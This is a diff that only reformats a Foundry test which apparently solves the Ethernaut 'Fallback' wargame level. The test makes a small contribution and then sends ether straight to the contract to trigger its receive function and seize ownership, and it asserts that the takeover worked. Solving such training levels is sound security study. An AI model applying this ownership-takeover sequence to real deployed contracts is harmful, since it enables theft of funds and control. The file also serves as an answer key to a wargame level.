@@ -36,7 +36,9 @@ contract TestFallbackSolution is Test, Utils {
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Fallback(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
+        instance = Fallback(
+            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
+        );
         vm.stopPrank();
     }
 
@@ -57,7 +59,10 @@ contract TestFallbackSolution is Test, Utils {
         vm.startPrank(player);
         instance.contribute{value: 0.00005 ether}();
 
-        console.log("Player contribution:",instance.contributions(address(player)));
+        console.log(
+            "Player contribution:",
+            instance.contributions(address(player))
+        );
 
         // once player contributed can send ether to trigger receive and claim ownership
         address(instance).call{value: 0.05 ether}("");
@@ -65,5 +70,4 @@ contract TestFallbackSolution is Test, Utils {
         // assert that player is the owner now
         assertEq(instance.owner(), player);
     }
-
 }
